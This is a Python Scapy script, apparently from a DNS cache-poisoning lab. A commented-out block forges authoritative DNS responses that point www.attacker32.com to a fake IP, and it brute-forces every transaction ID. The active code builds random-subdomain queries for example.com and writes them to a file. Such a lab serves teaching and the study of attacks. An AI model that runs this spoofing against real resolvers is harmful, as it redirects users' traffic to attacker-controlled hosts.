# from scapy.all import *
#
# def send_spoofed_response(dns_id):
#     # Details of the forged DNS response
#     name = 'www.attacker32.com'
#     fake_ip = '1.2.3.4'  # The fake IP to return
#
#     # Construct DNS response (spoofed)
#     dns_response = (
#         IP(dst="10.9.0.53", src="10.9.0.153") /  # Send to local DNS server from attacker's nameserver
#         UDP(dport=53, sport=53) /  # Use DNS port
#         DNS(
#             id=dns_id,  # The transaction ID you guessed
#             qr=1,  # This is a response
#             aa=1,  # Authoritative answer
#             qd=DNSQR(qname=name),  # The query section
#             an=DNSRR(rrname=name, ttl=10, rdata=fake_ip),  # The answer section with the spoofed IP
#         )
#     )
#
#     # Send the response
#     send(dns_response)
#
# if __name__ == "__main__":
#     # Loop through a wide range of transaction IDs
#     for dns_id in range(0x0000, 0xFFFF):  # Guess transaction IDs
#         send_spoofed_response(dns_id)

from scapy.all import *
import string
import random
import time

from scapy.layers.dns import DNS, DNSQR
from scapy.layers.inet import UDP, IP


def send_dns_request():
    # Generate a random subdomain
    random_subdomain = ''.join(random.choices(string.ascii_lowercase, k=5))
    qname = f"{random_subdomain}.example.com"

    dns_request = IP(dst="10.9.0.53") / UDP(sport=RandShort(), dport=53) / DNS(rd=1, qd=DNSQR(qname=qname))
    # Save the DNS request to a binary file
    with open("ip_req.bin", "wb") as file:
        file.write(bytes(dns_request))
    
    # print(f"Sending DNS request for {qname} to 10.9.0.53")
    # send(dns_request, verbose=0)


if __name__ == "__main__":
    # while True:
    send_dns_request()
        # time.sleep(0.1)  # Add a small delay to avoid flooding